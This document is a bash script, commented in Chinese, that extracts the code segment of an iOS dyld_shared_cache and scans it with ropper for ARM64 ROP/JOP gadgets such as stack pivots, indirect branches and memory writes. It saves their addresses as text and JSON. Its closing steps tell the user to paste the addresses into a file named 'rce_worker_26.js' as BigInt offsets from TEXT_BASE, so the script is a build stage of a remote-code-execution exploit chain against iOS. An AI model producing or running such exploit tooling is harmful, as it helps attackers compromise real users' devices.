#!/bin/bash
# ROP Gadget Scanner for iOS dyld_shared_cache
# 
# 此脚本从已提取的 __TEXT 段中查找常用的 ROP/JOP gadget
# 
# 使用方法:
#   ./scan_gadgets.sh /path/to/dyld_shared_cache_arm64e
# 
# 输出:
#   gadgets_<build_id>.txt - 所有找到的 gadget
#   gadgets_<build_id>.json - JSON 格式的 gadget 地址

set -e

if [ $# -ne 1 ]; then
    echo "Usage: $0 <dyld_shared_cache_path>"
    echo
    echo "Example:"
    echo "  $0 dyld_shared_cache_arm64e"
    exit 1
fi

CACHE_PATH="$1"
CACHE_NAME=$(basename "$CACHE_PATH")
OUTPUT_PREFIX="gadgets_${CACHE_NAME}"

# 检查工具
command -v jtool2 >/dev/null 2>&1 || {
    echo "ERROR: jtool2 not found"
    echo "Download from: http://www.newosxbook.com/tools/jtool.html"
    exit 1
}

command -v ropper >/dev/null 2>&1 || {
    echo "ERROR: ropper not found"
    echo "Install: pip3 install ropper"
    exit 1
}

echo "==================================="
echo "ROP Gadget Scanner"
echo "==================================="
echo "Cache: $CACHE_PATH"
echo "Output: ${OUTPUT_PREFIX}.txt"
echo

# Step 1: 提取 TEXT 段
echo "[1/3] Extracting __TEXT segment..."
jtool2 --extract __TEXT "$CACHE_PATH" 2>&1 | grep -v "^$" || true

TEXT_FILE="${CACHE_PATH}.__TEXT"
if [ ! -f "$TEXT_FILE" ]; then
    echo "ERROR: Failed to extract __TEXT segment"
    exit 1
fi

echo "  Extracted: $TEXT_FILE ($(du -h "$TEXT_FILE" | cut -f1))"
echo

# Step 2: 扫描常用 gadget
echo "[2/3] Scanning for common gadgets (this may take 5-10 minutes)..."
echo

# 定义需要查找的 gadget 模式
declare -a GADGET_PATTERNS=(
    "mov x0, x1; ret"
    "ldr x0, \[x0, #0x10\]; ret"
    "ldr x0, \[x0\]; ret"
    "blr x8"
    "br x8"
    "ldp x29, x30, \[sp\], #0x10; ret"
    "ldp x29, x30, \[sp, #.*\]; ret"
    "mov x0, #0; ret"
    "str x0, \[x1\]; ret"
    "add x0, x0, x1; ret"
    "sub x0, x0, x1; ret"
    "mov sp, x0; ret"
)

# 创建输出文件
> "${OUTPUT_PREFIX}.txt"
> "${OUTPUT_PREFIX}.json"

echo "{" >> "${OUTPUT_PREFIX}.json"
echo "  \"build\": \"${CACHE_NAME}\"," >> "${OUTPUT_PREFIX}.json"
echo "  \"extraction_date\": \"$(date +%Y-%m-%d)\"," >> "${OUTPUT_PREFIX}.json"
echo "  \"gadgets\": {" >> "${OUTPUT_PREFIX}.json"

FIRST=true

for pattern in "${GADGET_PATTERNS[@]}"; do
    echo "  Searching: $pattern"
    
    # 使用 ropper 查找
    RESULT=$(ropper --file "$TEXT_FILE" --arch arm64 --search "$pattern" 2>/dev/null | grep "0x" || true)
    
    if [ -n "$RESULT" ]; then
        COUNT=$(echo "$RESULT" | wc -l)
        echo "    Found: $COUNT matches"
        
        # 提取第一个地址
        FIRST_ADDR=$(echo "$RESULT" | head -1 | grep -o "0x[0-9a-f]*" | head -1)
        
        # 保存到文本文件
        echo "=== $pattern ===" >> "${OUTPUT_PREFIX}.txt"
        echo "$RESULT" >> "${OUTPUT_PREFIX}.txt"
        echo >> "${OUTPUT_PREFIX}.txt"
        
        # 保存到 JSON（转换为合法的 key）
        JSON_KEY=$(echo "$pattern" | sed 's/[^a-zA-Z0-9_]/_/g')
        
        if [ "$FIRST" = true ]; then
            FIRST=false
        else
            echo "," >> "${OUTPUT_PREFIX}.json"
        fi
        
        echo -n "    \"$JSON_KEY\": \"${FIRST_ADDR}n\"" >> "${OUTPUT_PREFIX}.json"
    else
        echo "    Not found"
    fi
done

echo >> "${OUTPUT_PREFIX}.json"
echo "  }" >> "${OUTPUT_PREFIX}.json"
echo "}" >> "${OUTPUT_PREFIX}.json"

echo

# Step 3: 清理临时文件
echo "[3/3] Cleaning up..."
rm -f "$TEXT_FILE"

echo
echo "==================================="
echo "Scan Complete"
echo "==================================="
echo "Results saved to:"
echo "  ${OUTPUT_PREFIX}.txt  (human-readable)"
echo "  ${OUTPUT_PREFIX}.json (machine-readable)"
echo
echo "Next steps:"
echo "  1. Review the gadgets in ${OUTPUT_PREFIX}.txt"
echo "  2. Copy required gadget addresses to rce_worker_26.js"
echo "  3. Adjust addresses by subtracting TEXT_BASE (0x180000000)"
echo
echo "Example:"
echo "  Gadget at 0x180123456"
echo "  TEXT_BASE = 0x180000000"
echo "  Relative offset = 0x123456"
echo "  In code: TEXT_BASE + 0x123456n"